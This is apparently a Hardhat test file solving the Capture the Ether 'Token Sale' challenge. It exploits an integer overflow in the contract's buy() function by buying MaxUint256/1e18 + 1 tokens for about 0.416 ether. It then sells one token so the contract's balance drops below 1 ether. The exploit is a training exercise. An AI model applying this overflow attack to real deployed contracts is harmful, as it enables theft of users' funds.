import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("TokenSaleChallenge", function () {
  it("should return true if we reduce the contract's ether below 1", async function () {
    const [, player] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory("TokenSaleChallenge");

    const challenge = await Challenge.deploy(player.address, {
      value: ethers.utils.parseEther("1"),
    });
    await challenge.deployed();

    const buyTx = await challenge
      .connect(player)
      .buy(
        ethers.constants.MaxUint256.div(
          BigNumber.from(ethers.utils.parseEther("1"))
        ).add(1),
        {
          value: BigNumber.from("415992086870360064"),
        }
      );

    await buyTx.wait();

    const sellTx = await challenge.connect(player).sell(1);
    await sellTx.wait();

    expect(await challenge.isComplete()).to.equal(true);
  });
});
